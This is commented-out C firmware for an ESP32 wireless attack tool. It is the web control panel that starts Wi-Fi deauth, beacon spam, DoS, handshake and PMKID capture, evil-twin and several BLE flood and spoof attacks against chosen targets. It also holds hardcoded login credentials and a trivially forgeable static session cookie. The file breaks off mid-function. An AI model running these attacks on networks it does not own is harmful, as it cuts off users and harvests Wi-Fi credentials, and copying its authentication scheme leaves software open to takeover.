// #include <stdio.h>
// #include <string.h>
// #include <stdlib.h>
// #include <time.h>
// #include <stdbool.h>
// #include "freertos/FreeRTOS.h"
// #include "freertos/task.h"
// #include "esp_log.h"
// #include "esp_event.h"
// #include "esp_http_server.h"
// #include "cJSON.h"
// #include "wifi_scanner.h"
// #include "wifi_controller.h"
// #include "attack_deauth.h"
// #include "attack_deauth_detector.h"
// #include "attack_beacon_spam.h"
// #include "attack_dos.h"
// #include "attack_handshake.h"
// #include "attack_pmkid.h"
// #include "attack_probe.h"
// #include "attack_eviltwin.h"
// #include "attack_bt_spam.h"
// #include "bt/ble_scan.h"
// #include "bt/ble_spoof.h"
// #include "bt/ble_connect_flood.h"
// #include "bt/ble_l2cap_flood.h"
// #include "bt/ble_gatt_probe.h"
// #include "bt/ble_deauth.h"
// #include "attack.h"
// #include "web_ui.h"

// static const char *TAG = "WEB_SERVER";
// static httpd_handle_t server_handle = NULL;
// static wifi_ap_record_t dos_target = {0};
// static wifi_ap_record_t handshake_target = {0};
// static wifi_ap_record_t pmkid_target = {0};
// static wifi_ap_record_t evil_twin_target = {0};

// ESP_EVENT_DEFINE_BASE(WEBSERVER_EVENTS);

// #define USERNAME "omega"
// #define PASSWORD "solutions123"

// static int attack_duration_minutes = 0;
// static time_t attack_start_time = 0;
// static bool attack_timer_active = false;
// static TaskHandle_t attack_timer_handle = NULL;

// static bool session_cookie_is_authenticated(const char *cookie) {
//     if (cookie == NULL) {
//         return false;
//     }

//     const char expected[] = "session=authenticated";
//     const size_t expected_len = sizeof(expected) - 1;

//     while (*cookie != '\0') {
//         while (*cookie == ' ' || *cookie == ';') {
//             cookie++;
//         }

//         const char *end = strchr(cookie, ';');
//         size_t len = end ? (size_t)(end - cookie) : strlen(cookie);
//         while (len > 0 && cookie[len - 1] == ' ') {
//             len--;
//         }

//         if (len == expected_len && strncmp(cookie, expected, expected_len) == 0) {
//             return true;
//         }

//         if (end == NULL) {
//             break;
//         }
//         cookie = end + 1;
//     }

//     return false;
// }

// static bool request_is_authenticated(httpd_req_t *req) {
//     char cookie[100] = {0};
//     if (httpd_req_get_hdr_value_str(req, "Cookie", cookie, sizeof(cookie)) != ESP_OK) {
//         return false;
//     }

//     return session_cookie_is_authenticated(cookie);
// }

// static bool get_form_value(const char *content, const char *key, char *out, size_t out_size) {
//     if (content == NULL || key == NULL || out == NULL || out_size == 0) {
//         return false;
//     }

//     char marker[40];
//     int marker_len = snprintf(marker, sizeof(marker), "%s=", key);
//     if (marker_len <= 0 || (size_t)marker_len >= sizeof(marker)) {
//         return false;
//     }

//     const char *value = strstr(content, marker);
//     if (value == NULL) {
//         return false;
//     }
//     value += marker_len;

//     size_t len = strcspn(value, "&");
//     if (len >= out_size) {
//         len = out_size - 1;
//     }

//     memcpy(out, value, len);
//     out[len] = '\0';

//     // URL-decode in place (+ => space, %xx => byte) and trim trailing whitespace.
//     char *src = out;
//     char *dst = out;
//     while (*src) {
//         if (*src == '+') {
//             *dst++ = ' ';
//             src++;
//             continue;
//         }
//         if (*src == '%' && src[1] && src[2]) {
//             int hi = src[1];
//             int lo = src[2];
//             hi = (hi >= '0' && hi <= '9') ? (hi - '0') :
//                  (hi >= 'a' && hi <= 'f') ? (hi - 'a' + 10) :
//                  (hi >= 'A' && hi <= 'F') ? (hi - 'A' + 10) : -1;
//             lo = (lo >= '0' && lo <= '9') ? (lo - '0') :
//                  (lo >= 'a' && lo <= 'f') ? (lo - 'a' + 10) :
//                  (lo >= 'A' && lo <= 'F') ? (lo - 'A' + 10) : -1;
//             if (hi >= 0 && lo >= 0) {
//                 *dst++ = (char)((hi << 4) | lo);
//                 src += 3;
//                 continue;
//             }
//         }
//         *dst++ = *src++;
//     }
//     *dst = '\0';
//     while (dst > out && (dst[-1] == '\r' || dst[-1] == '\n' || dst[-1] == ' ' || dst[-1] == '\t')) {
//         *--dst = '\0';
//     }
//     return true;
// }

// static bool parse_bssid(const char *value, uint8_t bssid[6]) {
//     if (value == NULL || bssid == NULL) {
//         return false;
//     }

//     unsigned int bytes[6];
//     if (sscanf(value, "%2x:%2x:%2x:%2x:%2x:%2x",
//                &bytes[0], &bytes[1], &bytes[2], &bytes[3], &bytes[4], &bytes[5]) != 6) {
//         return false;
//     }

//     for (size_t i = 0; i < 6; i++) {
//         if (bytes[i] > 0xff) {
//             return false;
//         }
//         bssid[i] = (uint8_t)bytes[i];
//     }

//     return true;
// }

// static bool fill_ap_record_from_json(cJSON *root, wifi_ap_record_t *record, bool require_ssid) {
//     if (root == NULL || record == NULL) {
//         return false;
//     }

//     cJSON *bssid_json = cJSON_GetObjectItem(root, "bssid");
//     cJSON *channel_json = cJSON_GetObjectItem(root, "channel");
//     cJSON *ssid_json = cJSON_GetObjectItem(root, "ssid");

//     if (!cJSON_IsString(bssid_json) || !cJSON_IsNumber(channel_json)) {
//         return false;
//     }
//     if (require_ssid && !cJSON_IsString(ssid_json)) {
//         return false;
//     }
//     if (channel_json->valueint <= 0 || channel_json->valueint > 14) {
//         return false;
//     }

//     memset(record, 0, sizeof(*record));
//     if (!parse_bssid(bssid_json->valuestring, record->bssid)) {
//         return false;
//     }

//     record->primary = (uint8_t)channel_json->valueint;
//     if (cJSON_IsString(ssid_json) && ssid_json->valuestring != NULL) {
//         strncpy((char *)record->ssid, ssid_json->valuestring, sizeof(record->ssid) - 1);
//         record->ssid[sizeof(record->ssid) - 1] = '\0';
//     }

//     return true;
// }

// static esp_err_t send_json_response(httpd_req_t *req, cJSON *root) {
//     if (root == NULL) {
//         httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON allocation failed");
//         return ESP_FAIL;
//     }

//     char *response = cJSON_PrintUnformatted(root);
//     if (response == NULL) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "JSON serialization failed");
//         return ESP_FAIL;
//     }

//     httpd_resp_set_type(req, "application/json");
//     esp_err_t err = httpd_resp_send(req, response, strlen(response));
//     cJSON_Delete(root);
//     free(response);
//     return err;
// }

// static esp_err_t send_success_response(httpd_req_t *req) {
//     cJSON *response = cJSON_CreateObject();
//     if (response != NULL) {
//         cJSON_AddBoolToObject(response, "success", true);
//     }
//     return send_json_response(req, response);
// }

// static wifi_ap_record_t *scan_networks(size_t *ap_count) {
//     if (ap_count == NULL) {
//         return NULL;
//     }

//     scanner_scan();
//     const wifictl_ap_records_t *records = scanner_get_records();
//     if (records == NULL || records->count == 0) {
//         *ap_count = 0;
//         return NULL;
//     }

//     *ap_count = records->count;
//     wifi_ap_record_t *copy = malloc(sizeof(wifi_ap_record_t) * records->count);
//     if (copy == NULL) {
//         return NULL;
//     }

//     memcpy(copy, records->records, sizeof(wifi_ap_record_t) * records->count);
//     return copy;
// }

// static bool is_attack_active(void) {
//     const attack_status_t *status = attack_get_status();
//     return status && status->state == RUNNING;
// }

// static void get_attack_target(char *target) {
//     if (target == NULL) {
//         return;
//     }

//     const attack_status_t *status = attack_get_status();
//     if (status == NULL || status->content == NULL || status->content_size == 0) {
//         target[0] = '\0';
//         return;
//     }

//     size_t len = status->content_size < 127 ? status->content_size : 127;
//     memcpy(target, status->content, len);
//     target[len] = '\0';
// }

// // Timer task for deauth
// static void attack_timer_task(void *pvParameters) {
//     while (attack_timer_active) {
//         vTaskDelay(pdMS_TO_TICKS(1000));
//         int remaining = (attack_duration_minutes * 60) - (time(NULL) - attack_start_time);
//         if (remaining <= 0 && attack_duration_minutes > 0) {
//             attack_timer_active = false;
//             stop_deauth_attack();
//             break;
//         }
//     }
//     attack_timer_handle = NULL;
//     vTaskDelete(NULL);
// }

// // ============ LOGIN HANDLERS ============
// static esp_err_t login_post_handler(httpd_req_t *req) {
//     char content[256] = {0};
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
    
//     char username[32] = {0}, password[32] = {0};
//     get_form_value(content, "username", username, sizeof(username));
//     get_form_value(content, "password", password, sizeof(password));
    
//     if (strcmp(username, USERNAME) == 0 && strcmp(password, PASSWORD) == 0) {
//         httpd_resp_set_hdr(req, "Set-Cookie", "session=authenticated; path=/");
//         httpd_resp_set_hdr(req, "Location", "/dashboard");
//         httpd_resp_set_status(req, "302 Found");
//         httpd_resp_send(req, "", 0);
//     } else {
//         httpd_resp_set_hdr(req, "Location", "/login?error=1");
//         httpd_resp_set_status(req, "302 Found");
//         httpd_resp_send(req, "", 0);
//     }
//     return ESP_OK;
// }

// static esp_err_t dashboard_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_set_hdr(req, "Location", "/login");
//         httpd_resp_set_status(req, "302 Found");
//         httpd_resp_send(req, "", 0);
//         return ESP_OK;
//     }
//     httpd_resp_set_type(req, "text/html");
//     httpd_resp_send(req, advanced_dashboard_html, strlen(advanced_dashboard_html));
//     return ESP_OK;
// }

// static esp_err_t login_handler(httpd_req_t *req) {
//     httpd_resp_set_type(req, "text/html");
//     httpd_resp_send(req, advanced_login_html, strlen(advanced_login_html));
//     return ESP_OK;
// }

// static esp_err_t logout_handler(httpd_req_t *req) {
//     httpd_resp_set_hdr(req, "Set-Cookie", "session=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT");
//     httpd_resp_set_hdr(req, "Location", "/login");
//     httpd_resp_set_status(req, "302 Found");
//     httpd_resp_send(req, "", 0);
//     return ESP_OK;
// }

// static esp_err_t root_handler(httpd_req_t *req) {
//     httpd_resp_set_hdr(req, "Location", "/login");
//     httpd_resp_set_status(req, "302 Found");
//     httpd_resp_send(req, "", 0);
//     return ESP_OK;
// }

// // ============ API HANDLERS ============
// static esp_err_t scan_api_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
    
//     size_t ap_count = 0;
//     wifi_ap_record_t *ap_records = scan_networks(&ap_count);
//     if (ap_records == NULL && ap_count > 0) {
//         httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Scan failed");
//         return ESP_FAIL;
//     }
//     cJSON *root = cJSON_CreateArray();
//     if (root == NULL) {
//         free(ap_records);
//         return send_json_response(req, root);
//     }
//     for (size_t i = 0; i < ap_count; i++) {
//         if (ap_records[i].ssid[0] == 0) continue;
//         cJSON *network = cJSON_CreateObject();
//         if (network == NULL) {
//             free(ap_records);
//             cJSON_Delete(root);
//             return send_json_response(req, NULL);
//         }
//         cJSON_AddStringToObject(network, "ssid", (char*)ap_records[i].ssid);
//         char bssid_str[18];
//         snprintf(bssid_str, sizeof(bssid_str), MACSTR, MAC2STR(ap_records[i].bssid));
//         cJSON_AddStringToObject(network, "bssid", bssid_str);
//         cJSON_AddNumberToObject(network, "channel", ap_records[i].primary);
//         cJSON_AddNumberToObject(network, "rssi", ap_records[i].rssi);
//         const char *auth = "Open";
//         if (ap_records[i].authmode == WIFI_AUTH_WEP) auth = "WEP";
//         else if (ap_records[i].authmode == WIFI_AUTH_WPA_PSK) auth = "WPA";
//         else if (ap_records[i].authmode == WIFI_AUTH_WPA2_PSK) auth = "WPA2";
//         else if (ap_records[i].authmode == WIFI_AUTH_WPA_WPA2_PSK) auth = "WPA/WPA2";
//         cJSON_AddStringToObject(network, "authmode", auth);
//         cJSON_AddItemToArray(root, network);
//     }
//     free(ap_records);
//     return send_json_response(req, root);
// }

// static esp_err_t mgmt_ap_get_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }

//     char ssid[33] = {0};
//     char pass[64] = {0};
//     if (wifictl_mgmt_ap_get_creds(ssid, sizeof(ssid), pass, sizeof(pass)) != ESP_OK) {
//         httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Failed to read AP config");
//         return ESP_FAIL;
//     }

//     cJSON *root = cJSON_CreateObject();
//     if (root != NULL) {
//         cJSON_AddStringToObject(root, "ssid", ssid);
//         cJSON_AddBoolToObject(root, "secured", strlen(pass) >= 8);
//     }
//     return send_json_response(req, root);
// }

// static esp_err_t mgmt_ap_set_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }

//     char content[256];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) {
//         return ESP_FAIL;
//     }
//     content[ret] = '\0';

//     cJSON *root = cJSON_Parse(content);
//     if (!root) {
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
//         return ESP_FAIL;
//     }

//     cJSON *ssid_json = cJSON_GetObjectItem(root, "ssid");
//     cJSON *pass_json = cJSON_GetObjectItem(root, "password");
//     if (!cJSON_IsString(ssid_json) || !cJSON_IsString(pass_json)) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing ssid/password");
//         return ESP_FAIL;
//     }

//     esp_err_t err = wifictl_mgmt_ap_set_creds(ssid_json->valuestring, pass_json->valuestring);
//     cJSON_Delete(root);
//     if (err != ESP_OK) {
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid SSID/password");
//         return ESP_FAIL;
//     }

//     wifictl_mgmt_ap_stop();
//     wifictl_mgmt_ap_start();
//     return send_success_response(req);
// }

// static esp_err_t mgmt_ap_reset_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }

//     if (wifictl_mgmt_ap_clear_creds() != ESP_OK) {
//         httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Failed to clear AP config");
//         return ESP_FAIL;
//     }

//     wifictl_mgmt_ap_stop();
//     wifictl_mgmt_ap_start();
//     return send_success_response(req);
// }

// static esp_err_t attack_api_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
    
//     char content[200];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;
//     cJSON *bssid_json = cJSON_GetObjectItem(root, "bssid");
//     cJSON *channel_json = cJSON_GetObjectItem(root, "channel");
//     cJSON *minutes_json = cJSON_GetObjectItem(root, "minutes");
    
//     if (!cJSON_IsString(bssid_json) || !cJSON_IsNumber(channel_json) ||
//         channel_json->valueint <= 0 || channel_json->valueint > 14) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing bssid or channel");
//         return ESP_FAIL;
//     }
    
//     uint8_t bssid[6];
//     if (!parse_bssid(bssid_json->valuestring, bssid)) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid bssid");
//         return ESP_FAIL;
//     }
//     char bssid_str[18];
//     snprintf(bssid_str, sizeof(bssid_str), MACSTR, MAC2STR(bssid));
    
//     start_deauth_attack(bssid_str, channel_json->valueint);
    
//     if (cJSON_IsNumber(minutes_json) && minutes_json->valueint > 0) {
//         attack_duration_minutes = minutes_json->valueint <= 999 ? minutes_json->valueint : 999;
//         attack_start_time = time(NULL);
//         attack_timer_active = true;
//         if (attack_timer_handle == NULL) {
//             xTaskCreate(attack_timer_task, "attack_timer", 2048, NULL, 5, &attack_timer_handle);
//         }
//     }
    
//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t beacon_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
    
//     char content[100];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;
    
//     cJSON *mode_json = cJSON_GetObjectItem(root, "mode");
//     cJSON *count_json = cJSON_GetObjectItem(root, "count");
    
//     int mode = mode_json ? mode_json->valueint : 0;
//     int count = count_json ? count_json->valueint : 50;
    
//     attack_beacon_spam_start(count, mode);
    
//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t beacon_stop_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }

//     attack_beacon_spam_stop();
//     return send_success_response(req);
// }

// static esp_err_t ble_spam_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }

//     char content[200];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';

//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;

//     cJSON *device_type_json = cJSON_GetObjectItem(root, "device_type");
//     cJSON *delay_json = cJSON_GetObjectItem(root, "delay_ms");

//     if (!cJSON_IsNumber(device_type_json) || !cJSON_IsNumber(delay_json)) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "device_type and delay_ms are required");
//         return ESP_FAIL;
//     }

//     int device_type = device_type_json->valueint;
//     int delay_ms = delay_json->valueint;

//     if (device_type < 1 || device_type > 25) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "device_type must be between 1 and 25");
//         return ESP_FAIL;
//     }
//     if (delay_ms < 0 || delay_ms > 2000) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "delay_ms must be between 0 and 2000");
//         return ESP_FAIL;
//     }

//     attack_bt_spam_init();

//     bt_spam_config_t config = {0};
//     config.device_type = device_type;
//     config.delay_ms = delay_ms;
//     attack_bt_spam_start(&config);

//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t ble_spam_stop_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }

//     attack_bt_spam_stop();
//     return send_success_response(req);
// }

// static esp_err_t ble_spoof_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
//     char content[200];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;
//     cJSON *name = cJSON_GetObjectItem(root, "name");
//     const char *sname = cJSON_IsString(name) ? name->valuestring : NULL;
//     ble_spoof_start(sname);
//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t ble_spoof_stop_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
//     ble_spoof_stop();
//     return send_success_response(req);
// }

// static esp_err_t ble_connect_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
//     char content[200];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;
//     cJSON *addr = cJSON_GetObjectItem(root, "addr");
//     const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
//     ble_connect_flood_start(saddr);
//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t ble_connect_stop_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
//     ble_connect_flood_stop();
//     return send_success_response(req);
// }

// static esp_err_t ble_l2cap_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
//     char content[200];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;
//     cJSON *addr = cJSON_GetObjectItem(root, "addr");
//     const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
//     ble_l2cap_start(saddr);
//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t ble_l2cap_stop_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
//     ble_l2cap_stop();
//     return send_success_response(req);
// }

// static esp_err_t ble_gatt_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
//     char content[200];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;
//     cJSON *addr = cJSON_GetObjectItem(root, "addr");
//     const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
//     ble_gatt_probe_start(saddr);
//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t ble_gatt_stop_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
//     ble_gatt_probe_stop();
//     return send_success_response(req);
// }

// static esp_err_t ble_deauth_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
//     char content[200];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;
//     cJSON *addr = cJSON_GetObjectItem(root, "addr");
//     const char *saddr = cJSON_IsString(addr) ? addr->valuestring : NULL;
//     ble_deauth_start(saddr);
//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t ble_deauth_stop_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
//     ble_deauth_stop();
//     return send_success_response(req);
// }

// static esp_err_t ble_scan_api_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }

//     cJSON *result = ble_scan_perform(5000);
//     if (result == NULL) result = cJSON_CreateArray();
//     return send_json_response(req, result);
// }

// static esp_err_t ble_status_api_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }

//     cJSON *response = cJSON_CreateObject();
//     if (response == NULL) {
//         return send_json_response(req, response);
//     }
//     cJSON_AddBoolToObject(response, "running", attack_bt_spam_is_running());
//     return send_json_response(req, response);
// }

// static esp_err_t stop_api_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }

//     attack_timer_active = false;
//     stop_deauth_attack();
//     /* Also stop BLE spam if running */
//     attack_bt_spam_stop();
//     return send_success_response(req);
// }

// static esp_err_t status_api_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
    
//     cJSON *response = cJSON_CreateObject();
//     if (response == NULL) {
//         return send_json_response(req, response);
//     }
//     cJSON_AddBoolToObject(response, "attacking", is_attack_active());
//     cJSON_AddBoolToObject(response, "ble_running", attack_bt_spam_is_running());
//     cJSON_AddBoolToObject(response, "ble_deauth_running", ble_deauth_is_running());
//     cJSON_AddBoolToObject(response, "ble_connect_running", ble_connect_flood_is_running());
//     cJSON_AddBoolToObject(response, "ble_l2cap_running", ble_l2cap_is_running());
//     if (attack_bt_spam_is_running()) {
//         cJSON_AddStringToObject(response, "bluetooth", "BLE spam active");
//     }
//     if (ble_deauth_is_running()) {
//         cJSON_AddStringToObject(response, "ble_deauth", "BLE deauth active");
//     }
//     if (is_attack_active()) {
//         char target[18];
//         get_attack_target(target);
//         cJSON_AddStringToObject(response, "target", target);
//         if (attack_timer_active) {
//             int elapsed = time(NULL) - attack_start_time;
//             int remaining = (attack_duration_minutes * 60) - elapsed;
//             if (remaining > 0) cJSON_AddNumberToObject(response, "remaining", remaining);
//         }
//     }
//     return send_json_response(req, response);
// }

// static esp_err_t detector_api_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
    
//     const deauth_detector_status_t *status = deauth_detector_get_status();
//     cJSON *root = cJSON_CreateObject();
//     if (root == NULL) {
//         return send_json_response(req, root);
//     }
//     cJSON_AddBoolToObject(root, "running", status->running);
//     cJSON_AddNumberToObject(root, "tracked_bssids", status->count);
//     cJSON *alerts = cJSON_CreateArray();
//     if (alerts == NULL) {
//         cJSON_Delete(root);
//         return send_json_response(req, NULL);
//     }
//     for (int i = 0; i < status->count; i++) {
//         if (status->entries[i].alerting) {
//             cJSON *alert = cJSON_CreateObject();
//             if (alert == NULL) {
//                 cJSON_Delete(root);
//                 return send_json_response(req, NULL);
//             }
//             char bssid_str[18];
//             snprintf(bssid_str, sizeof(bssid_str), MACSTR, MAC2STR(status->entries[i].bssid));
//             cJSON_AddStringToObject(alert, "bssid", bssid_str);
//             cJSON_AddNumberToObject(alert, "count", status->entries[i].count);
//             cJSON_AddItemToArray(alerts, alert);
//         }
//     }
//     cJSON_AddItemToObject(root, "alerts", alerts);
//     return send_json_response(req, root);
// }

// // New API handlers
// static esp_err_t dos_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
    
//     char content[200];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;
    
//     cJSON *method_json = cJSON_GetObjectItem(root, "method");
    
//     if (!fill_ap_record_from_json(root, &dos_target, true)) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
//         return ESP_FAIL;
//     }
    
//     attack_config_t attack_config = {0};
//     attack_config.target_count = 1;
//     attack_config.ap_records[0] = &dos_target;
//     int dos_method = cJSON_IsNumber(method_json) ? method_json->valueint : ATTACK_DOS_METHOD_BROADCAST;
//     if (dos_method < ATTACK_DOS_METHOD_ROGUE_AP || dos_method > ATTACK_DOS_METHOD_SUPER_CLONE) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid method");
//         return ESP_FAIL;
//     }
//     attack_config.method = dos_method;
    
//     ESP_LOGI(TAG, "Starting DoS attack with method: %d", attack_config.method);
//     attack_dos_start(&attack_config);
    
//     cJSON_Delete(root);
//     return send_success_response(req);
// }

// static esp_err_t handshake_start_handler(httpd_req_t *req) {
//     if (!request_is_authenticated(req)) {
//         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
//         return ESP_FAIL;
//     }
    
//     char content[200];
//     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
//     if (ret <= 0) return ESP_FAIL;
//     content[ret] = '\0';
//     cJSON *root = cJSON_Parse(content);
//     if (!root) return ESP_FAIL;
    
//     cJSON *method_json = cJSON_GetObjectItem(root, "method");
    
//     if (!fill_ap_record_from_json(root, &handshake_target, true)) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
//         return ESP_FAIL;
//     }
    
//     attack_config_t attack_config = {0};
//     attack_config.target_count = 1;
//     attack_config.ap_records[0] = &handshake_target;
//     int handshake_method = cJSON_IsNumber(method_json) ? method_json->valueint : ATTACK_HANDSHAKE_METHOD_BROADCAST;
//     if (handshake_method < ATTACK_HANDSHAKE_METHOD_ROGUE_AP || handshake_method > ATTACK_HANDSHAKE_METHOD_PASSIVE) {
//         cJSON_Delete(root);
//         httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid method");
//         return ESP_FAIL;
//     }
//     attack_config.method = handshake_method;
    
